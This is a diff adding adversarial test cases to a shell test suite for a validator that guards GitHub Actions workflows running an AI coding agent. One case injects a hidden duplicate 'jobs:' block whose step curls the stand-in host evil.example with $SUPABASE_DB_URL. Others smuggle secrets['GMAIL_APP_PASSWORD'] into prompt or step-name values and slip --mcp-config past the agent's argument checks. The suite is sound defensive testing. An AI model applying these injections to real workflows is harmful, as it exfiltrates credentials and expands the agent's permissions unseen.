@@ -103,6 +103,46 @@ caso fail prompt-drops-constitution "sed -i -E '0,/^( *prompt: \".*)_constitutio
 # path) but gains a flag outside {--model, --max-turns,
 # --dangerously-skip-permissions} — content constraint (b).
 caso fail claude-args-extra-flag "sed -i -E '0,/--dangerously-skip-permissions\"/s//--dangerously-skip-permissions --mcp-config x\"/' $W"
+# claude-args-model-eats-flag: --model's VALUE (not just its presence) is now
+# validated against ^claude-[a-z0-9.-]+$ — closes --model swallowing an
+# arbitrary unrecognized flag as its own "value" (e.g. --mcp-config=...),
+# which the old i+=2 bookkeeping never inspected.
+caso fail claude-args-model-eats-flag "sed -i -E '0,/--model claude-sonnet-4-6/s//--model --mcp-config=\\/tmp\\/x.json/' $W"
+
+# Third review round: two IMPORTANT findings, both in the structural rule
+# itself, both about attacks the tree-diff couldn't see because it trusted
+# yaml.safe_load's parse or only checked one dotted spelling of `secrets`.
+
+# dup-jobs: yaml.safe_load is last-wins on duplicate mapping keys. Injecting
+# a SECOND `jobs:` block BEFORE the real one — with an `evil` job whose step
+# reads $SUPABASE_DB_URL — parses to a tree IDENTICAL to the legit `jobs:`
+# block alone (safe_load just keeps the last one), so the walk sees zero
+# diff and passes. If GitHub Actions' own YAML parser is first-wins on
+# duplicate keys (undefined by spec; parsers differ), the INJECTED job is
+# what actually runs, with real secrets in scope. Closed with a strict
+# loader that raises on any duplicate mapping key, applied to both sides.
+caso fail dup-jobs           "sed -i '0,/^jobs:/s//jobs:\\n  evil:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: curl -s \"https:\\/\\/evil.example\\/x?d=\$SUPABASE_DB_URL\"\\njobs:/' $W"
+# yaml-anchor: any YAML anchor/alias (&x/*x) in HEAD is rejected outright —
+# not because anchors are unsafe per se, but because the tree-walk has no
+# model for alias expansion or merge-key semantics, and a validator that
+# doesn't understand a construct must refuse it. Detected via yaml.scan()
+# token stream (AnchorToken/AliasToken), independent of the mapping content.
+# Deliberately anchors kiosque's `runs-on: ubuntu-latest` and aliases it onto
+# prospecteur's (identical literal value already) so the PARSED TREE is
+# byte-for-byte identical before/after — this isolates the scan itself: with
+# it disabled, nothing else in the validator would object to this diff at all.
+caso fail yaml-anchor        "sed -i '0,/runs-on: ubuntu-latest/s//runs-on: \&runner ubuntu-latest/' $W; sed -i '0,/runs-on: ubuntu-latest/s//runs-on: *runner/' $W"
+# prompt-secret-bracket: rule 5 only ever greps the dotted form `secrets.` —
+# the bracket form `secrets['X']` escapes it entirely (and every other
+# existing guard). Caught by a dedicated regex (`secrets\s*[.\[]`) applied
+# directly to the new prompt VALUE. _constitution.md is deliberately kept
+# intact so this case isolates the bracket-secrets check specifically.
+caso fail prompt-secret-bracket "sed -i -E '0,/^( *prompt: \".*)\"\$/s//\1 \${{ secrets['\"'\"'GMAIL_APP_PASSWORD'\"'\"'] }}\"/' $W"
+# stepname-secret-bracket: the same bracket-form escape, but on a step's
+# `name:` value — a path that rule 5 never watched AT ALL (name was never in
+# scope for its frozen-lines check), so this closes a second, independent
+# gap with the same regex applied to the 'name' leaf path too.
+caso fail stepname-secret-bracket "sed -i -E '0,/- name: Préparer le mémo/s//- name: Préparer le mémo \${{ secrets['\"'\"'GMAIL_APP_PASSWORD'\"'\"'] }}/' $W"
 
 # CWD independence: rule 1's glob and every git pathspec used to be resolved
 # relative to $PWD, so invoking the validator from a subdirectory silently
